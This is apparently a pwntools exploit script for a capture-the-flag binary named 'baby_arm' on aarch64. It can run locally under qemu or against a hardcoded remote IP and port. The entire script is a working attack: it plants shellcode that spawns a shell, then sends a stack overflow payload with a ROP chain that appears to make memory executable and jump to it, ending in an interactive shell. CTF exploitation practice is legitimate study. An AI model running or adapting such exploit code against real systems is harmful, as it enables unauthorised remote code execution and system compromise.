from pwn import *
import sys
import time
context.binary = "./baby_arm"
binary = './baby_arm'

if sys.argv[1] == "r":
    p = remote("106.75.126.171",33865)
elif sys.argv[1] == "l":
    p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", binary])
else:
    p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu/", binary])

elf = ELF("./baby_arm")


context.log_level = "debug"

buf = asm(shellcraft.aarch64.sh())

buf = buf.ljust(0x100,'\x00')
buf += p64(0x400600)


p.recvuntil('Name:')
#shellcode = "\x1e\x00\x80\xd2\x1d\x00\x80\xd2"

p.send(buf.ljust(512,'\x00'))

payload = 'a'*72 + p64(0x4008CC) + p64(0) + p64(0x4008AC) + p64(0) + p64(1) + p64(0x411168) + p64(5)
payload += p64(0x1000) + p64(0x411000) + p64(0) + p64(0x411068) + p64(0xdeadbeef)*6

p.send(payload)



p.interactive()